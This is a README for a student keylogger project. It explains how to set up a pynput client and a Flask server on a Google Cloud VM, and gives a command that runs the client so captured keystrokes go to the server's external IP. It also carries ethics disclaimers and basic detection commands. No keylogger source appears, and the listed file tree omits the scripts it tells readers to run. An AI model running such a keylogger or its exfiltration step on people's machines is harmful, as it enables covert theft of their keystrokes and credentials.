# Keystroke Logging: Understanding Keyloggers Through Ethical Hacking

> **⚠️ EDUCATIONAL PURPOSE ONLY**: This project is developed for academic learning in cybersecurity education. This code DOES NOT promote or encourage any illegal activities! The content is provided solely for educational purposes and to create awareness about cybersecurity threats and defenses.

## 🎓 Academic Project Overview

- **Course**: Cybersecurity and Ethical Hacking
- **Objective**: Understand keylogger threats through hands-on, cloud-deployed experimentation in a controlled, authorized environment
- **Scope**: Python-based keylogger with real-time capture and remote data transmission, hosted on Google Cloud Platform (GCP)
- **Ethics**: Strictly for responsible research and educational awareness
- **Inspiration**: [Keylogger using Python - YouTube Tutorial](https://youtu.be/LBM3EzBXhdY?si=NIRSjLUVw2aTOTdx)

## 🔍 What You'll Learn

- **Keystroke capture mechanisms** (Python, pynput)
- **Client-server network communication** (Flask, HTTP, port management)
- **Cloud infrastructure deployment** (GCP, Ubuntu, SSD, firewall rules)
- **Remote Desktop Protocol (RDP)** setup for GUI management
- **Ethical, legal, and professional considerations** for cybersecurity research
- **Detection and prevention techniques** (logs, monitoring, endpoint security)

## 🚀 Getting Started

### Prerequisites

- Python 3.x (Windows recommended for this lab)
- Git (for cloning this repository)
- GCP Account (for cloud deployment)
- Basic Linux/Ubuntu knowledge (for server setup)
- Commitment to ethical and legal use

### 1. Clone the Repository

```bash
git clone https://github.com/AlexWaynee/keylogger-ethical-hacking-project.git
cd keylogger-ethical-hacking-project
```

### 2. Set Up the Python Environment (Windows)

```bash
# Create a virtual environment
python -m venv keylogger_env

# Activate the environment
keylogger_env\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

**Note**: If you are using Linux/macOS, use:

```bash
python3 -m venv keylogger_env
source keylogger_env/bin/activate
pip install -r requirements.txt
```

But the project was developed and tested primarily on Windows.

### 3. Required Dependencies

Your `requirements` should include:

```text
pynput==1.7.6
flask==2.3.3
requests==2.31.0
```

These are installed automatically in the step above.

## 4. Cloud Infrastructure Setup

### Google Cloud Platform (GCP) Configuration

1. **Create a GCP Project** for isolated testing
2. **Launch a VM Instance**:
   - **OS**: Ubuntu 20.04 LTS
   - **Boot Disk**: SSD Persistent
   - **Networking**: Allow HTTP/HTTPS traffic
3. **Configure Firewall**: Open port 8080 for server communication
4. **Connect via SSH**: Use the GCP console or `gcloud compute ssh`
5. **Set Up RDP** (Remote Desktop Protocol) for GUI access (optional, but helpful for testing):

```bash
# On the GCP VM
sudo apt update && sudo apt upgrade -y
sudo apt install tasksel dialog -y
sudo tasksel install xfce4-desktop

# Create a new user with sudo rights (optional)
sudo adduser keylogger-user
sudo usermod -aG sudo keylogger-user

# Verify open ports
ss -tuln
```

6. **Launch the server**:

```bash
python3 keylogger_server.py
```

## 5. Run the Project

### Local Testing

```bash
# In one terminal, run the server
python keylogger_server.py

# In another terminal, run the client
python keylogger_client.py
```

### Cloud Deployment

1. **On GCP VM**: Start the server (`python keylogger_server.py`)
2. **On your local machine**: Run the client, pointing to the cloud server's external IP:

```bash
python keylogger_client.py --server-url http://[GCP-EXTERNAL-IP]:8080
```

## 6. Test Output Verification

- **Local**: Check `keylog.txt` for captured keystrokes
- **Server**: Check `server_keylog.txt` for received logs on the GCP VM

## 📂 Repository Structure

```
keylogger-ethical-hacking-project/
├── README.md              # This file - project overview and setup
├── LICENSE                # Educational license and usage terms
├── .gitignore
└── documentation/
    ├── Introduction.md    # Project context and ethics
    ├── Report.md          # Technical, ethical, and legal documentation
    └── Presentation.pptx  # Academic slides
```

## 🔒 Security, Ethics & Legal Compliance

- **Authorized Use Only**: Test only on systems you own or have explicit permission to use
- **Educational Purpose**: This tool is designed for learning, not malicious activities
- **Transparent Implementation**: No hidden functionality or backdoors
- **Responsible Disclosure**: Emphasize defense, countermeasures, and ethical standards
- **Legal Responsibility**: Users must ensure compliance with GDPR, CCPA, and local laws

## 🛡️ Detection, Prevention & Defense

- **Endpoint Security**: Use EDR and behavioral analysis
- **Network Monitoring**: Watch for unusual outbound traffic
- **Application Whitelisting**: Restrict unauthorized executables
- **User Education**: Recognize and report suspicious activities
- **Multi-Factor Authentication (MFA)**: Reduce credential theft impact

### Technical Countermeasures (for discussion):

```bash
# Example: Monitor active python processes
ps aux | grep python | grep -v grep

# Check open network connections
netstat -an | grep :8080

# Find recent log files
find /home -name "*.txt" -mtime -1 -exec ls -la {} \;
```

## 📊 Testing & Validation

- **Controlled Environment Testing**: Safe, authorized scenarios only
- **Performance Metrics**: Capture accuracy, network latency, resource usage
- **Security Analysis**: Attack and defense perspectives, detailed in `Report.md`
- **Documentation**: See `documentation/` for full technical and ethical discussion

## 🛠️ Advanced Notes

- **Antivirus Discussion**: For educational purposes only, this project may be flagged by security software. We do not provide instructions for bypassing security measures
- **Windows-Specific Development**: The virtual environment setup and initial testing were performed on Windows, but the server deployment and RDP setup are Ubuntu/Linux-based
- **Cloud Best Practices**: Always follow GCP documentation for secure configuration

## 📚 Educational Resources

- **Recommended Reading**: OWASP Top 10, NIST Framework, Ethical Hacking Methodologies
- **Related Topics**: Endpoint Detection & Response (EDR), Network Security Monitoring, Digital Forensics, Privacy Engineering

## 🤝 Contributing & Support

- **Code Reviews**: Analyze for security best practices
- **Defense Strategies**: Develop and test countermeasures
- **Documentation**: Improve clarity and educational value
- **Ethical Analysis**: Contribute to responsible security research discussions

For academic questions, review the documentation in `documentation/` or consult your instructor.

## ⚠️ Important Disclaimers

- **Educational Use Only**: No warranty, no responsibility for misuse
- **No Malicious Intent**: Strictly for authorized, controlled learning
- **Professional Standards**: Maintain high ethical and legal standards

## 📄 License

This project is released under an Educational License—see `LICENSE` for details.

**Commercial use, malicious application, or unauthorized deployment is strictly prohibited.**

---

**Remember**: The aim is to promote cybersecurity awareness, build better defenses, and uphold privacy. Always use knowledge ethically and responsibly.
